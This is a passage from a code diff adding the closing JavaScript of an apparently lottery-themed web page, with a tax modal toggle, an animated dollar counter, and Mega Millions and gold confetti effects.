+            if(e) e.preventDefault();
+            document.getElementById('taxModal').classList.add('active');
+        }
+        function closeTaxModal() {
+            document.getElementById('taxModal').classList.remove('active');
+        }
+
+        // Generic Animated Counter Logic
+        function animateCounter(id, start, end, duration) {
+            const obj = document.getElementById(id);
+            let startTimestamp = null;
+            const step = (timestamp) => {
+                if (!startTimestamp) startTimestamp = timestamp;
+                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+                
+                const easeOut = 1 - Math.pow(1 - progress, 3);
+                const currentVal = Math.floor(easeOut * (end - start) + start);
+                
+                obj.innerHTML = "$" + currentVal.toLocaleString('en-US');
+                
+                if (progress < 1) {
+                    window.requestAnimationFrame(step);
+                } else {
+                    obj.innerHTML = "$" + end.toLocaleString('en-US'); // End exact
+                }
+            };
+            window.requestAnimationFrame(step);
+        }
+
+        // Mega Millions Confetti (Blue/Red/Yellow/White)
+        function fireMegaConfetti() {
+            var duration = 4.5 * 1000; 
+            var animationEnd = Date.now() + duration;
+            var defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 100, colors:['#0056a8', '#ffc72c', '#ffffff', '#d50032'] };
+
+            function randomInRange(min, max) { return Math.random() * (max - min) + min; }
+
+            var interval = setInterval(function() {
+                var timeLeft = animationEnd - Date.now();
+                if (timeLeft <= 0) { return clearInterval(interval); }
+                var particleCount = 50 * (timeLeft / duration);
+                confetti(Object.assign({}, defaults, { particleCount, origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 } }));
+                confetti(Object.assign({}, defaults, { particleCount, origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 } }));
+            }, 250);
+        }
+
+        // Pure Gold Confetti for View 3
+        function firePureGoldConfetti() {
+            var duration = 4 * 1000; 
+            var animationEnd = Date.now() + duration;
+            var defaults = { startVelocity: 35, spread: 360, ticks: 80, zIndex: 100, colors:['#d4af37', '#ffea75', '#ffc72c', '#ffffff'] };
+
+            function randomInRange(min, max) { return Math.random() * (max - min) + min; }
+
+            var interval = setInterval(function() {
+                var timeLeft = animationEnd - Date.now();
+                if (timeLeft <= 0) { return clearInterval(interval); }
+                var particleCount = 60 * (timeLeft / duration);
+                confetti(Object.assign({}, defaults, { particleCount, origin: { x: randomInRange(0.2, 0.4), y: Math.random() - 0.2 } }));
+                confetti(Object.assign({}, defaults, { particleCount, origin: { x: randomInRange(0.6, 0.8), y: Math.random() - 0.2 } }));
+            }, 250);
+        }
+    </script>
+</body>
+</html>
